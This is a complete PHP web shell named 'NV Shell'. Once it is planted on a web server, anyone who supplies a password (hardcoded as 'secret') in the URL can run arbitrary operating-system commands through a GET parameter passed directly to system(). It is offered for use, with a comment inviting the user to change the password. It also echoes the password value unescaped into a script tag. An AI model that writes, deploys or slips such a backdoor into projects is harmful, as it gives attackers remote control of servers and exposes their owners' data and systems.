<?php 
/*
	Command line shell by Adarsh Mohanty(Null_Void)
	Git profile:https://github.com/Adarsh-Mohanty
███╗   ██╗██╗   ██╗██╗     ██╗         ██╗   ██╗ ██████╗ ██╗██████╗ 
████╗  ██║██║   ██║██║     ██║         ██║   ██║██╔═══██╗██║██╔══██╗
██╔██╗ ██║██║   ██║██║     ██║         ██║   ██║██║   ██║██║██║  ██║
██║╚██╗██║██║   ██║██║     ██║         ╚██╗ ██╔╝██║   ██║██║██║  ██║
██║ ╚████║╚██████╔╝███████╗███████╗     ╚████╔╝ ╚██████╔╝██║██████╔╝
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝      ╚═══╝   ╚═════╝ ╚═╝╚═════╝ 
                                                                     
*/
if(isset($_GET['pass']) && $_GET['pass']=="secret"){																		//Change the password by changing the word "secret" to your desired value
echo '<html><head><title>NV Shell</title><style>input:focus{    outline-color:Green;}body::-webkit-scrollbar {
    width: 0.2em;
}
 
body::-webkit-scrollbar-track {
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
}
 
body::-webkit-scrollbar-thumb {
  background-color: #085308;
  outline: 1px solid slategrey;
}</style></head><body style="     background: black;    margin: 0;"><div style="width:100%;height:100%;margin: 0;position: relative;padding: 0;"><form METHOD="GET" NAME="myform" ACTION=""><input STYLE="width: 95%;color:green;background: #202020;border: 0;border-bottom: 1px solid gray;padding: 1px 10px;font-size: 1.4em;font-family: monospace;" TYPE="text" NAME="cmd" autocomplete="off"><input STYLE="width: 5%;color: green;background: #202020;border: 0;margin: 0;font-size: 1.4em;border-left: 1px solid gray;border-bottom: 1px solid gray;font-family: monospace;" TYPE="submit" VALUE="Send"><input type="hidden" name="pass" id="p" value=""></form><pre style="padding:10px; color:green;font-size:1em;font-family:monospace;">';
if(isset($_GET['cmd']) && $_GET['cmd']!='') {
  system($_GET['cmd']);
  }else{
  	echo '';
  }
echo '</pre></div><script>document.getElementById("p").value="'.$_GET['pass'].'"</script></body></html>';
}else
echo "<h1 align='center'>Wrong Password!</h1>";

?>